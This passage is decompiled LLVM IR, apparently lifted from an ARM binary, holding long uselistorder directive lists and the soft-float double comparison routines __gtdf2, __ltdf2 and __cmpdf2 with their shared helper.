  uselistorder i32 4, { 19, 20, 354, 765, 153, 430, 766, 767, 768, 769, 423, 424, 781, 425, 426, 427, 428, 429, 243, 244, 245, 431, 432, 433, 434, 435, 436, 782, 783, 684, 685, 686, 687, 688, 113, 689, 690, 698, 699, 700, 187, 701, 702, 703, 134, 704, 784, 785, 370, 246, 492, 437, 438, 371, 0, 372, 1, 373, 2, 374, 3, 786, 189, 375, 188, 111, 112, 377, 376, 378, 380, 381, 382, 379, 383, 384, 787, 170, 788, 789, 790, 247, 385, 248, 439, 157, 770, 771, 772, 773, 774, 21, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 778, 779, 780, 462, 463, 464, 775, 776, 777, 493, 494, 791, 792, 793, 794, 795, 22, 23, 497, 138, 796, 797, 798, 705, 706, 501, 502, 707, 708, 465, 466, 467, 468, 469, 470, 471, 709, 249, 710, 711, 712, 713, 714, 715, 24, 716, 515, 250, 190, 717, 251, 4, 5, 252, 718, 732, 733, 192, 191, 734, 253, 472, 473, 474, 475, 476, 114, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 836, 491, 254, 255, 25, 256, 257, 26, 495, 496, 838, 258, 498, 499, 500, 259, 837, 691, 27, 28, 29, 602, 30, 31, 799, 32, 186, 181, 182, 33, 868, 183, 869, 141, 34, 35, 184, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 36, 887, 888, 889, 890, 891, 892, 140, 893, 894, 895, 896, 897, 898, 37, 38, 185, 899, 731, 193, 800, 801, 802, 803, 806, 807, 808, 809, 810, 136, 811, 812, 813, 814, 816, 815, 817, 260, 692, 693, 694, 695, 696, 697, 39, 503, 504, 505, 506, 40, 507, 41, 42, 261, 262, 926, 43, 927, 263, 358, 359, 665, 666, 667, 158, 668, 264, 631, 44, 508, 265, 509, 266, 154, 510, 754, 267, 755, 756, 757, 758, 759, 760, 268, 269, 511, 270, 271, 512, 45, 513, 514, 139, 155, 907, 916, 917, 918, 919, 920, 272, 273, 46, 908, 909, 910, 911, 912, 913, 914, 915, 274, 903, 906, 719, 720, 721, 722, 723, 724, 725, 726, 727, 47, 728, 729, 730, 839, 48, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 275, 276, 277, 854, 855, 858, 861, 856, 857, 194, 278, 859, 115, 860, 862, 863, 864, 866, 279, 50, 49, 865, 280, 281, 282, 739, 51, 740, 156, 516, 517, 518, 52, 519, 520, 741, 283, 284, 285, 735, 736, 196, 737, 195, 738, 643, 638, 639, 640, 641, 642, 386, 137, 387, 388, 389, 390, 391, 392, 393, 135, 394, 395, 396, 397, 398, 399, 400, 402, 53, 401, 403, 404, 405, 54, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 742, 867, 55, 56, 57, 58, 6, 59, 142, 143, 60, 7, 818, 61, 62, 286, 116, 63, 64, 743, 555, 287, 65, 288, 289, 290, 291, 819, 820, 66, 821, 292, 822, 823, 824, 198, 825, 826, 197, 293, 827, 828, 829, 830, 831, 832, 117, 294, 833, 835, 295, 296, 834, 355, 744, 67, 745, 199, 746, 747, 563, 564, 565, 144, 159, 566, 567, 568, 748, 749, 546, 900, 804, 805, 356, 68, 69, 904, 905, 357, 70, 71, 297, 72, 521, 298, 299, 200, 300, 301, 302, 303, 201, 304, 305, 522, 306, 8, 73, 74, 75, 307, 9, 308, 10, 523, 309, 11, 761, 310, 12, 524, 525, 921, 76, 922, 762, 526, 527, 421, 528, 923, 529, 530, 531, 532, 533, 534, 535, 77, 632, 633, 78, 763, 536, 79, 547, 537, 538, 539, 145, 540, 541, 924, 542, 543, 925, 80, 544, 311, 81, 312, 313, 901, 902, 314, 315, 545, 548, 549, 764, 316, 553, 550, 551, 552, 422, 554, 160, 82, 83, 84, 85, 86, 87, 88, 317, 202, 203, 204, 89, 318, 205, 206, 207, 208, 118, 171, 119, 120, 13, 14, 556, 209, 557, 210, 172, 90, 91, 558, 211, 559, 560, 561, 562, 569, 212, 570, 213, 571, 572, 319, 573, 574, 575, 576, 577, 578, 579, 580, 360, 320, 321, 361, 322, 323, 215, 362, 363, 324, 325, 326, 327, 219, 328, 329, 217, 214, 364, 218, 92, 330, 216, 161, 146, 241, 365, 331, 332, 366, 333, 334, 221, 367, 368, 335, 336, 337, 338, 225, 339, 340, 223, 220, 369, 224, 93, 341, 222, 162, 147, 242, 342, 121, 227, 226, 228, 122, 343, 229, 94, 95, 123, 344, 581, 582, 124, 345, 230, 583, 231, 125, 346, 232, 148, 584, 233, 585, 234, 126, 347, 235, 149, 586, 127, 348, 236, 587, 163, 96, 588, 589, 173, 590, 174, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 97, 98, 99, 15, 601, 603, 128, 604, 129, 605, 606, 607, 100, 164, 150, 608, 130, 609, 610, 612, 611, 175, 613, 614, 615, 616, 101, 165, 151, 617, 131, 618, 619, 621, 620, 176, 622, 623, 624, 625, 102, 626, 132, 627, 177, 628, 629, 630, 103, 166, 152, 634, 133, 237, 635, 178, 636, 637, 644, 167, 645, 104, 646, 647, 648, 650, 649, 179, 651, 652, 653, 105, 349, 654, 168, 655, 106, 656, 657, 658, 660, 659, 180, 661, 662, 663, 664, 169, 669, 107, 670, 238, 671, 672, 673, 674, 675, 676, 350, 351, 352, 16, 17, 677, 678, 679, 680, 681, 239, 682, 683, 750, 240, 751, 752, 753, 353, 108, 109, 110, 18 }
  uselistorder i32 32, { 197, 198, 199, 200, 82, 83, 95, 145, 146, 85, 86, 201, 84, 96, 202, 203, 204, 205, 92, 206, 147, 89, 148, 149, 180, 181, 182, 207, 134, 135, 136, 137, 3, 4, 138, 139, 208, 155, 101, 209, 183, 184, 150, 151, 152, 153, 189, 102, 111, 5, 7, 6, 9, 8, 0, 154, 156, 97, 87, 210, 103, 69, 211, 212, 104, 105, 224, 185, 186, 106, 187, 188, 222, 10, 11, 13, 12, 223, 15, 14, 17, 16, 19, 18, 191, 157, 190, 177, 178, 140, 141, 71, 91, 88, 192, 193, 194, 213, 214, 68, 215, 1, 107, 216, 217, 218, 219, 220, 221, 70, 158, 159, 195, 169, 21, 20, 22, 108, 160, 23, 24, 25, 90, 109, 26, 161, 162, 196, 163, 164, 165, 166, 142, 130, 176, 225, 226, 170, 227, 167, 168, 143, 144, 171, 131, 28, 27, 30, 29, 72, 112, 55, 56, 113, 114, 57, 115, 116, 58, 117, 59, 32, 31, 118, 73, 119, 120, 60, 132, 61, 33, 172, 34, 35, 121, 62, 63, 122, 123, 64, 124, 125, 65, 126, 37, 36, 127, 74, 128, 129, 66, 133, 67, 38, 173, 39, 40, 75, 42, 41, 44, 43, 76, 46, 45, 77, 48, 47, 79, 50, 49, 78, 110, 52, 51, 80, 98, 174, 93, 175, 99, 100, 2, 179, 94, 81, 54, 53 }
  uselistorder i32 33, { 12, 13, 14, 10, 15, 16, 11, 0, 7, 5, 4, 3, 2, 8, 6, 1, 9 }
  uselistorder i32 768, { 2, 0, 1 }
  uselistorder i32 268435456, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder i32 16777216, { 2, 3, 5, 4, 6, 7, 8, 10, 9, 12, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 36, 35, 0, 1 }
  uselistorder i32 256, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 118, 14, 15, 16, 17, 18, 119, 19, 21, 22, 20, 23, 24, 25, 26, 120, 27, 28, 29, 144, 30, 33, 32, 31, 121, 135, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 148, 66, 149, 67, 150, 68, 151, 152, 69, 70, 72, 71, 73, 74, 75, 76, 0, 133, 1, 77, 138, 122, 78, 79, 80, 81, 82, 83, 84, 85, 139, 87, 86, 88, 134, 89, 90, 91, 92, 93, 94, 95, 96, 145, 97, 98, 99, 115, 146, 100, 101, 102, 114, 136, 147, 113, 137, 103, 104, 153, 123, 124, 125, 117, 116, 126, 127, 128, 129, 105, 106, 107, 108, 109, 110, 111, 112, 130, 140, 141, 131, 142, 132, 143 }
  uselistorder i32 1048576, { 21, 0, 1, 2, 22, 23, 13, 3, 4, 5, 24, 6, 7, 25, 26, 16, 17, 8, 9, 27, 28, 29, 19, 30, 10, 14, 11, 18, 12, 20, 15, 31 }
  uselistorder i32 2047, { 5, 6, 7, 2, 0, 3, 8, 1, 4, 9 }
  uselistorder i32* @r6, { 517, 518, 519, 520, 377, 378, 7, 379, 380, 42, 90, 91, 92, 93, 94, 95, 96, 521, 522, 523, 524, 525, 87, 88, 89, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 381, 382, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 529, 530, 531, 532, 533, 534, 535, 536, 537, 109, 110, 111, 112, 113, 114, 115, 49, 50, 538, 539, 8, 540, 541, 545, 546, 547, 526, 9, 10, 527, 528, 116, 117, 118, 119, 120, 179, 180, 548, 549, 46, 550, 41, 330, 331, 332, 11, 121, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 204, 205, 206, 207, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 444, 445, 446, 450, 451, 455, 456, 122, 123, 124, 125, 129, 126, 127, 128, 130, 131, 133, 132, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 12, 13, 163, 164, 165, 166, 167, 168, 169, 170, 173, 171, 172, 174, 175, 176, 177, 178, 181, 182, 183, 597, 598, 602, 603, 184, 185, 186, 599, 14, 600, 601, 383, 15, 384, 385, 551, 552, 553, 554, 16, 555, 556, 557, 558, 559, 560, 561, 386, 387, 388, 389, 17, 18, 390, 391, 392, 393, 394, 395, 396, 397, 187, 188, 189, 190, 191, 192, 193, 194, 19, 20, 21, 632, 633, 634, 635, 636, 674, 5, 675, 676, 51, 22, 52, 23, 53, 637, 638, 195, 196, 197, 502, 503, 504, 505, 198, 199, 200, 201, 202, 203, 644, 648, 649, 650, 651, 645, 646, 647, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 604, 629, 630, 631, 605, 606, 607, 608, 609, 24, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 625, 627, 621, 622, 623, 624, 626, 628, 374, 375, 6, 376, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 477, 478, 479, 208, 209, 210, 211, 212, 213, 214, 215, 319, 320, 321, 322, 323, 216, 26, 25, 217, 218, 219, 220, 221, 222, 223, 468, 469, 27, 470, 471, 472, 473, 474, 475, 476, 368, 0, 369, 370, 371, 372, 373, 54, 55, 56, 57, 58, 59, 2, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 452, 453, 454, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 28, 480, 481, 542, 29, 543, 544, 482, 483, 484, 485, 486, 447, 30, 448, 449, 573, 574, 31, 43, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 3, 590, 591, 32, 76, 575, 1, 576, 577, 592, 593, 594, 595, 596, 224, 225, 48, 487, 488, 33, 489, 490, 491, 492, 311, 312, 313, 314, 315, 316, 317, 318, 513, 514, 515, 516, 307, 308, 309, 310, 493, 494, 495, 496, 497, 498, 499, 500, 501, 302, 303, 304, 305, 306, 283, 34, 226, 652, 653, 654, 655, 656, 657, 77, 78, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 658, 659, 4, 35, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 238, 239, 240, 241, 242, 44, 243, 244, 245, 246, 247, 248, 249, 250, 252, 251, 253, 333, 36, 334, 335, 356, 357, 336, 337, 338, 339, 340, 37, 341, 342, 38, 343, 344, 345, 346, 354, 355, 347, 348, 349, 350, 351, 352, 353, 506, 507, 508, 509, 254, 255, 79, 80, 81, 82, 83, 84, 256, 257, 258, 259, 260, 261, 262, 45, 39, 263, 264, 270, 271, 272, 273, 274, 275, 276, 265, 266, 267, 268, 269, 670, 671, 672, 673, 277, 278, 279, 639, 640, 641, 642, 643, 280, 281, 282, 284, 285, 286, 287, 288, 289, 290, 291, 292, 510, 47, 511, 512, 293, 299, 300, 301, 294, 295, 296, 297, 298, 40, 85, 324, 325, 326, 327, 328, 329, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 86 }
  uselistorder i32* @r5, { 875, 876, 877, 878, 879, 880, 881, 882, 883, 205, 206, 207, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 626, 627, 628, 629, 630, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 896, 897, 898, 899, 900, 901, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 907, 908, 909, 910, 911, 912, 234, 235, 236, 237, 913, 914, 915, 916, 631, 632, 633, 634, 635, 636, 659, 660, 661, 662, 663, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 13, 927, 928, 929, 930, 931, 932, 321, 322, 14, 323, 324, 325, 326, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 16, 107, 108, 109, 110, 111, 112, 15, 113, 114, 115, 116, 117, 118, 119, 120, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 66, 955, 956, 902, 17, 903, 904, 905, 906, 248, 18, 249, 19, 250, 251, 327, 328, 329, 330, 1021, 1022, 957, 958, 20, 959, 1020, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 21, 970, 971, 340, 341, 342, 343, 344, 345, 346, 347, 348, 559, 560, 561, 562, 22, 563, 564, 565, 566, 567, 568, 252, 253, 664, 665, 666, 667, 668, 669, 670, 671, 1, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 377, 378, 379, 380, 686, 687, 688, 689, 690, 691, 692, 693, 694, 23, 695, 696, 697, 698, 699, 745, 700, 701, 702, 703, 704, 705, 706, 63, 707, 708, 709, 726, 746, 747, 24, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 25, 763, 762, 67, 764, 765, 766, 767, 768, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 26, 297, 298, 299, 300, 270, 27, 271, 272, 273, 301, 302, 303, 304, 305, 306, 308, 74, 307, 309, 310, 311, 313, 75, 312, 314, 315, 316, 317, 318, 319, 320, 331, 332, 333, 1023, 1024, 1025, 1030, 335, 334, 64, 336, 337, 338, 339, 1026, 1027, 1028, 1029, 769, 770, 771, 772, 1066, 1067, 1068, 637, 76, 638, 8, 639, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 727, 728, 68, 729, 640, 641, 642, 643, 972, 2, 973, 974, 975, 976, 977, 978, 644, 30, 645, 646, 28, 647, 648, 649, 650, 651, 652, 29, 653, 654, 655, 656, 657, 658, 349, 31, 350, 351, 352, 353, 77, 354, 32, 355, 356, 357, 358, 359, 1081, 1082, 1083, 1031, 1032, 1033, 1061, 1062, 1063, 1064, 1065, 1145, 618, 619, 620, 121, 122, 123, 124, 125, 126, 127, 569, 570, 1084, 1085, 1086, 1087, 1088, 360, 361, 362, 363, 364, 365, 366, 367, 368, 845, 846, 847, 369, 370, 371, 372, 33, 34, 1097, 1142, 1143, 1144, 373, 374, 375, 376, 1098, 1099, 1103, 1104, 1105, 1106, 1107, 1100, 1101, 1102, 710, 711, 712, 35, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 1034, 1035, 1058, 1059, 1060, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 11, 1049, 1050, 1051, 1052, 1053, 36, 1054, 1055, 1056, 1057, 613, 614, 615, 616, 617, 773, 800, 801, 802, 774, 775, 776, 777, 778, 779, 792, 793, 794, 795, 796, 797, 798, 799, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 540, 541, 37, 542, 391, 392, 393, 394, 395, 396, 397, 398, 780, 781, 782, 783, 784, 785, 790, 791, 786, 787, 788, 789, 606, 38, 607, 608, 609, 610, 611, 612, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 39, 139, 140, 141, 142, 143, 144, 145, 146, 12, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 803, 40, 804, 805, 806, 979, 41, 980, 78, 981, 982, 983, 984, 985, 986, 807, 808, 809, 810, 811, 812, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 950, 951, 952, 953, 954, 813, 814, 3, 815, 816, 817, 740, 741, 742, 743, 744, 987, 988, 990, 989, 991, 992, 42, 993, 994, 995, 996, 997, 998, 999, 69, 1000, 1001, 1005, 9, 1006, 4, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 161, 162, 163, 1002, 1003, 1004, 1017, 5, 43, 1018, 1019, 400, 399, 65, 401, 402, 818, 819, 820, 821, 822, 823, 44, 824, 825, 523, 524, 525, 526, 527, 532, 533, 534, 535, 536, 537, 869, 870, 871, 872, 873, 874, 516, 517, 518, 519, 520, 521, 522, 826, 827, 828, 829, 830, 45, 831, 832, 513, 514, 6, 0, 515, 476, 1089, 46, 1090, 1091, 403, 404, 1108, 1110, 1109, 1112, 1111, 47, 1113, 405, 406, 407, 408, 164, 409, 48, 49, 410, 411, 412, 413, 50, 1114, 1115, 70, 1116, 1117, 1121, 1122, 1127, 1128, 1129, 165, 166, 167, 1118, 51, 1119, 1120, 7, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 432, 433, 168, 169, 170, 171, 434, 435, 436, 437, 429, 52, 430, 431, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 172, 173, 571, 572, 573, 574, 595, 575, 53, 576, 577, 578, 579, 580, 581, 582, 583, 594, 584, 585, 586, 587, 588, 589, 590, 591, 592, 54, 71, 593, 451, 848, 849, 850, 851, 852, 853, 854, 855, 856, 452, 453, 454, 477, 478, 479, 480, 174, 175, 176, 177, 178, 179, 180, 1130, 1131, 1132, 1133, 181, 182, 183, 184, 185, 186, 494, 495, 496, 528, 529, 530, 531, 1123, 1124, 1125, 1126, 837, 838, 839, 840, 833, 834, 835, 836, 841, 842, 843, 844, 187, 188, 189, 190, 551, 552, 553, 554, 191, 192, 621, 622, 623, 624, 193, 194, 195, 196, 455, 456, 457, 458, 459, 460, 461, 72, 462, 467, 468, 469, 463, 464, 465, 466, 1134, 1135, 55, 1136, 1137, 1138, 1139, 1140, 1141, 470, 471, 1092, 1093, 1094, 1095, 1096, 197, 198, 73, 56, 472, 57, 473, 474, 475, 10, 481, 482, 483, 484, 485, 58, 486, 490, 491, 199, 200, 201, 202, 487, 59, 488, 489, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 492, 493, 497, 79, 504, 505, 506, 507, 508, 509, 510, 511, 498, 499, 60, 500, 501, 502, 503, 61, 203, 62, 512, 80, 81, 82, 83, 84, 85, 538, 86, 87, 88, 89, 90, 91, 539, 543, 544, 545, 546, 547, 548, 549, 550, 555, 556, 557, 558, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 625, 204 }
  uselistorder i32 %arg4, { 0, 1, 11, 10, 2, 9, 8, 3, 4, 7, 5, 6, 12 }
  uselistorder i32 %arg3, { 2, 3, 9, 8, 4, 7, 6, 0, 1, 5, 10 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %dec_label_pc_34eb8, { 1, 0 }
  uselistorder label %dec_label_pc_34e9c, { 1, 0 }
  uselistorder label %bb110, { 1, 0 }
  uselistorder label %dec_label_pc_34e68, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb107, { 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread11, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_34d58, { 1, 0 }
  uselistorder label %dec_label_pc_34d40, { 1, 0 }
  uselistorder label %bb95, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__gtdf2() local_unnamed_addr {
entry:
  store i32 -1, i32* @ip, align 4
  %v0_34edc = call i32 @function_34eec()
  ret i32 %v0_34edc
}

define i32 @__ltdf2() local_unnamed_addr {
entry:
  store i32 1, i32* @ip, align 4
  %v0_34ee4 = call i32 @function_34eec()
  ret i32 %v0_34ee4

; uselistorder directives
  uselistorder i32 ()* @function_34eec, { 1, 0 }
}

define i32 @__cmpdf2() local_unnamed_addr {
entry:
  %v0_34ee8 = load i32, i32* @r0, align 4
  ret i32 %v0_34ee8
}

define i32 @function_34eec() local_unnamed_addr {
dec_label_pc_34eec:
  %v0_34eec = load i32, i32* @ip, align 4
  %v0_34ef0 = load i32, i32* @r1, align 4
  %v2_34ef0 = mul i32 %v0_34ef0, 2
  %v2_34ef0.off = add i32 %v2_34ef0, 4194303
  %tmp = icmp ult i32 %v2_34ef0.off, 2097152
  %v0_34ef8 = load i32, i32* @r3, align 4
  %v2_34ef8 = mul i32 %v0_34ef8, 2
  br i1 %tmp, label %dec_label_pc_34f48, label %bb

bb:                                               ; preds = %dec_label_pc_34eec
  %v2_34ef8.off = add i32 %v2_34ef8, 4194303
  %tmp21 = icmp ult i32 %v2_34ef8.off, 2097152
  br i1 %tmp21, label %dec_label_pc_34f3c, label %dec_label_pc_34f04

dec_label_pc_34f04:                               ; preds = %dec_label_pc_34f50, %dec_label_pc_34f5c, %bb
  %v0_34f04 = load i32, i32* @r0, align 4
  %v4_34f04 = or i32 %v0_34f04, %v2_34ef0
  %v6_34f04 = icmp eq i32 %v4_34f04, 0
  br i1 %v6_34f04, label %bb10, label %.thread

bb10:                                             ; preds = %dec_label_pc_34f04
  %v1_34f08 = load i32, i32* @r2, align 4
  %v5_34f08 = or i32 %v1_34f08, %v2_34ef8
  %v7_34f08 = icmp eq i32 %v5_34f08, 0
  br i1 %v7_34f08, label %.thread1, label %.thread

.thread:                                          ; preds = %dec_label_pc_34f04, %bb10
  %v5_34f0c = icmp eq i32 %v0_34ef8, %v0_34ef0
  br i1 %v5_34f0c, label %.thread..thread1_crit_edge, label %.thread2

.thread..thread1_crit_edge:                       ; preds = %.thread
  %v2_34f10.pre = load i32, i32* @r2, align 4
  br label %.thread1

.thread1:                                         ; preds = %.thread..thread1_crit_edge, %bb10
  %v2_34f10 = phi i32 [ %v2_34f10.pre, %.thread..thread1_crit_edge ], [ %v1_34f08, %bb10 ]
  %v5_34f10 = icmp eq i32 %v2_34f10, %v0_34f04
  br i1 %v5_34f10, label %bb11, label %.thread2

bb11:                                             ; preds = %.thread1
  store i32 0, i32* @r0, align 4
  br label %.thread2

.thread2:                                         ; preds = %.thread, %.thread1, %bb11
  %v1_34f18 = phi i1 [ false, %.thread ], [ false, %.thread1 ], [ true, %bb11 ]
  %v0_34f18 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_34f18, i32 %v0_34f18)
  %v0_34f1c = load i32, i32* @r0, align 4
  %v0_34f20 = load i32, i32* @r1, align 4
  %v1_34f20 = load i32, i32* @r3, align 4
  %v2_34f20 = xor i32 %v1_34f20, %v0_34f20
  %v3_34f20 = icmp slt i32 %v2_34f20, 0
  br i1 %v3_34f20, label %..thread3_crit_edge, label %bb12

bb12:                                             ; preds = %.thread2
  %v10_34f24 = icmp eq i32 %v0_34f20, %v1_34f20
  br i1 %v10_34f24, label %bb13, label %bb14

bb13:                                             ; preds = %bb12
  %v2_34f28 = load i32, i32* @r2, align 4
  %v4_34f28 = icmp ult i32 %v0_34f1c, %v2_34f28
  br i1 %v4_34f28, label %..thread3_crit_edge, label %bb15

bb14:                                             ; preds = %bb12
  %v4_34f24 = icmp ult i32 %v0_34f20, %v1_34f20
  br i1 %v4_34f24, label %..thread3_crit_edge, label %bb15

..thread3_crit_edge:                              ; preds = %bb13, %bb14, %.thread2
  %.pre8 = ashr i32 %v1_34f20, 31
  br label %.thread3

bb15:                                             ; preds = %bb13, %bb14
  %v2_34f2c = and i32 %v1_34f20, 1073741824
  %v3_34f2c = icmp eq i32 %v2_34f2c, 0
  %v4_34f2c = ashr i32 %v1_34f20, 31
  br i1 %v3_34f2c, label %.thread3, label %bb16

.thread3:                                         ; preds = %bb15, %..thread3_crit_edge
  %v4_34f30.pre-phi = phi i32 [ %.pre8, %..thread3_crit_edge ], [ %v4_34f2c, %bb15 ]
  %v5_34f30 = sub nsw i32 -1, %v4_34f30.pre-phi
  br label %bb16

bb16:                                             ; preds = %bb15, %.thread3
  %v0_34f34 = phi i32 [ %v4_34f2c, %bb15 ], [ %v5_34f30, %.thread3 ]
  %v1_34f34 = or i32 %v0_34f34, 1
  ret i32 %v1_34f34

dec_label_pc_34f3c:                               ; preds = %bb
  br label %dec_label_pc_34f50

dec_label_pc_34f48:                               ; preds = %dec_label_pc_34eec
  %v0_34f48 = load i32, i32* @r0, align 4
  %v4_34f48 = mul i32 %v0_34ef0, 4096
  %v5_34f48 = or i32 %v0_34f48, %v4_34f48
  %v7_34f48 = icmp eq i32 %v5_34f48, 0
  br i1 %v7_34f48, label %dec_label_pc_34f48.dec_label_pc_34f50_crit_edge, label %dec_label_pc_34f64

dec_label_pc_34f48.dec_label_pc_34f50_crit_edge:  ; preds = %dec_label_pc_34f48
  %v2_34ef8.off20 = add i32 %v2_34ef8, 4194303
  %tmp22 = icmp ult i32 %v2_34ef8.off20, 2097152
  br label %dec_label_pc_34f50

dec_label_pc_34f50:                               ; preds = %dec_label_pc_34f48.dec_label_pc_34f50_crit_edge, %dec_label_pc_34f3c
  %v3_34f54.pre-phi = phi i1 [ %tmp22, %dec_label_pc_34f48.dec_label_pc_34f50_crit_edge ], [ true, %dec_label_pc_34f3c ]
  br i1 %v3_34f54.pre-phi, label %dec_label_pc_34f5c, label %dec_label_pc_34f04

dec_label_pc_34f5c:                               ; preds = %dec_label_pc_34f50
  %v0_34f5c = load i32, i32* @r2, align 4
  %v4_34f5c = mul i32 %v0_34ef8, 4096
  %v5_34f5c = or i32 %v0_34f5c, %v4_34f5c
  %v7_34f5c = icmp eq i32 %v5_34f5c, 0
  br i1 %v7_34f5c, label %dec_label_pc_34f04, label %dec_label_pc_34f64

dec_label_pc_34f64:                               ; preds = %dec_label_pc_34f48, %dec_label_pc_34f5c
  ret i32 %v0_34eec

; uselistorder directives
  uselistorder i32 %v4_34f2c, { 1, 0 }
  uselistorder i32 %v1_34f20, { 2, 3, 1, 5, 4, 0 }
  uselistorder i32 %v0_34f20, { 2, 1, 0 }
  uselistorder i32 %v1_34f08, { 1, 0 }
  uselistorder i32 %v2_34ef8, { 0, 2, 1 }
  uselistorder i32 %v0_34ef8, { 1, 0, 2 }
  uselistorder i32 %v2_34ef0, { 1, 0 }
  uselistorder i32 %v0_34ef0, { 1, 0, 2 }
  uselistorder i32 31, { 19, 4, 2, 10, 11, 20, 3, 16, 22, 14, 12, 13, 1, 24, 0, 25, 26, 27, 28, 15, 21, 23, 8, 7, 9, 5, 17, 18, 6 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 21, 19, 20, 22, 23, 24, 25, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 26, 27, 28, 29, 30, 108, 2, 3, 4, 5, 6, 7, 8, 109, 39, 31, 111, 69, 40, 32, 33, 70, 71, 72, 75, 76, 78, 34, 36, 37, 38, 35, 116, 63, 118, 73, 112, 62, 68, 119, 134, 132, 133, 131, 120, 121, 0, 66, 67, 122, 123, 124, 126, 117, 9, 77, 79, 110, 74, 61, 114, 10, 115, 113, 41, 80, 81, 82, 83, 42, 125, 43, 44, 128, 127, 45, 46, 47, 130, 53, 48, 49, 11, 129, 50, 12, 13, 14, 15, 65, 64, 51, 1, 52, 54, 55, 58, 60, 56, 57, 59, 16, 17, 18 }
